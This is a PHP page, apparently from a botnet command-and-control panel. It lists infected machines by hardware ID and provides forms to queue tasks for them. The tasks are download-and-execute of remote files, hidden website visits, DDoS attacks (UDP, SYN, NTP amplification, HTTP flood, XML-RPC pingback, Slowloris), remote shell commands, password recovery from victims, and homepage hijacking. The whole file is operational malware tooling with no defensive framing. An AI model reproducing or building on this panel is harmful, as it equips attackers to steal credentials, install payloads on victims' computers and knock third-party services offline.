<?php
include('header.php');
$perpage = $settings->botspg;
$init = isset($_GET['init']) && $_GET['init']%$perpage == 0 ? (int)$_GET['init'] : 0;
$end = isset($_GET['end']) && $_GET['end']%$perpage == 0 ? (int)$_GET['end'] : $perpage;
$bots = $con->query("SELECT COUNT(*) FROM bots")->fetch()[0];
foreach($con->query("SELECT hwid FROM tasks WHERE command='uninstall' AND completed=1")->fetchAll(PDO::FETCH_COLUMN) as $row)
	$con->prepare("DELETE FROM bots WHERE hwid=?")->execute(array($row));
$con->query("DELETE FROM tasks WHERE command='uninstall' AND completed=1");
?>
	<div id="content">
		<form action="index.php" method="POST" id="task-form">
			<div id="content-content">
				<div id="content-header">
					<div id="content-title">
						Bots
					</div>
				</div>

				<div id="content-box">
					<div class="loading"><br><center><img src="img/icons/loading.gif" width="40" height="40"></center><br></div>
					<div class="botlist"></div>
				</div>
			</div>
			<div id="content-footer">
				<div id="navigation">
					<ul>
						<li><a href="index.php"><<</a></li>
						<?php
						for($i = $init - $perpage*10; $i <= $init + $perpage*10; $i+=$perpage) {
							$pi = $i-$perpage;
							$pe = $i;
							$text = $i/$perpage;
							if($text > 0 && $i - $perpage < $bots) {
								if ($init == $i-$perpage && $end == $i) $text = "<span class=\"green\">$text</span>";
								echo "<li><a href=\"?init=$pi&end=$pe\">$text</a></li>";
							}
						}
						$t = ((int)($bots/$perpage)) * $perpage;
						?>
						<li><a href="?init=<?php echo $t;?>&end=<?php echo $t + $perpage;?>">>></a></li>
					</ul>
				</div>
			</div>

			<div id="content-content">
				<div id="content-header">
					<div id="content-title">
						New Task
					</div>
				</div>

				<div id="content-box">
					<div id="content-strip">
						<div id="content-left">
							<div id="left-text">
								Command
							</div>
						</div>

						<div id="content-right">
							<select id="task">
								<option id="download">Download & Execute</option>
								<option id="visit">Visit Website</option>
								<option id="ddos">DDos</option>
								<option id="shell">Shell</option>
								<option id="kill">Uninstall</option>
								<option id="pass">Password Recovery</option>
								<option id="home">Change Homepage</option>
							</select>
						</div>
					</div>

					<div id="tasks-content">
						<div id="downloadform">
						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Parameter
								</div>
							</div>

							<div id="content-right">
								<input type="text" name="link" placeholder="http://website.com/filetodownload.exe" />
							</div>
						</div>

						<div id="content-strip2">
							<div id="content-left">
								<input type="submit" name="exec" value="Add Task" />
							</div>

							<div id="content-right" class="task-result">
								<!-- Output -->
							</div>
						</div>
					</div>

					<div id="visitform">
						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Method
								</div>
							</div>

							<div id="content-right">
								<select name="visible">
									<option value="1">Visible</option>
									<option value="0">Hidden</option>
								</select>
							</div>
						</div>

						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Url
								</div>
							</div>

							<div id="content-right">
								<input type="text" name="url" placeholder="http://www.google.com" />
							</div>
						</div>

						<div id="content-strip2">
							<div id="content-left">
								<input type="submit" name="visit" value="Add Task" />
							</div>

							<div id="content-right" class="task-result">
								<!-- Output -->
							</div>
						</div>
					</div>

					<div id="ddosform">
						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Method
								</div>
							</div>
							<script>
								function schange(){
									if(['flood','xmlrpc','slowloris','arme'].indexOf($('.ddmethod').val()) > -1) {
										$('input[name="target"]').prop("placeholder", "http://website.com");
										$('input[name="port"]').val(80);
									}else{
										$('input[name="target"]').prop("placeholder","127.0.0.1");
										$('input[name="port"]').val('');
									}
								}
							</script>
							<div id="content-right">
								<select name="type" id="task" class="ddmethod" onchange="schange()">
									<optgroup label="Layer 4">
										<option value="udp">UDP</option>
										<option value="flood">HTTP Flood</option>
										<option value="syn">SYN</option>
										<option value="ntp">NTP</option>
									</optgroup>
									<optgroup label="Layer 7">
										<option value="xmlrpc" >XML-RPC Pingback</option>
										<option value="slowloris">Slowloris</option>
										<option value="arme">A.R.M.E.</option>
									</optgroup>
								</select>
							</div>
						</div>

						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Target
								</div>
							</div>

							<div id="content-right">
								<input type="text" name="target" placeholder="127.0.0.1" />
							</div>
						</div>

						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Port
								</div>
							</div>

							<div id="content-right">
								<input type="text" name="port" placeholder="80" />
							</div>
						</div>

						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Time
								</div>
							</div>

							<div id="content-right">
								<input type="text" name="time" placeholder="Time in seconds" />
							</div>
						</div>

						<div id="content-strip2">
							<div id="content-left">
								<input type="submit" name="ddos" value="Add Task" />
							</div>

							<div id="content-right" class="task-result">
								<!-- Output -->
							</div>
						</div>
					</div>

					<div id="shellform">
						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Parameter
								</div>
							</div>

							<div id="content-right">
								<input type="text" name="command" placeholder="shutdown -t 30" />
							</div>
						</div>

						<div id="content-strip2">
							<div id="content-left">
								<input type="submit" name="cmd" value="Add Task" />
							</div>

							<div id="content-right" class="task-result">
								<!-- Output -->
							</div>
						</div>
					</div>

					<div id="killform">
						<div id="content-strip2">
							<div id="content-left">
								<input type="submit" name="kill" value="Add Task" />
							</div>

							<div id="content-right" class="task-result">
								<!-- Output -->
							</div>
						</div>
					</div>

					<div id="passform">
						<div id="content-strip2">
							<div id="content-left">
								<input type="submit" name="pass" value="Add Task" />
							</div>

							<div id="content-right" class="task-result">
								<!-- Output -->
							</div>
						</div>
					</div>

					<div id="homeform">
						<div id="content-strip">
							<div id="content-left">
								<div id="left-text">
									Homepage
								</div>
							</div>
							<div id="content-right">
								<input type="text" name="page" placeholder="http://google.com" />
							</div>
						</div>
						<div id="content-strip2">
							<div id="content-left">
								<input type="submit" name="home" value="Add Task" />
							</div>

							<div id="content-right" class="task-result">
								<!--Output-->
							</div>
						</div>
					</div>
					</div>
				</div>
			</div>
		</form>
	</div>
<script>
	regForm();
	getBots();
</script>
<?php
include('footer.php');
?>
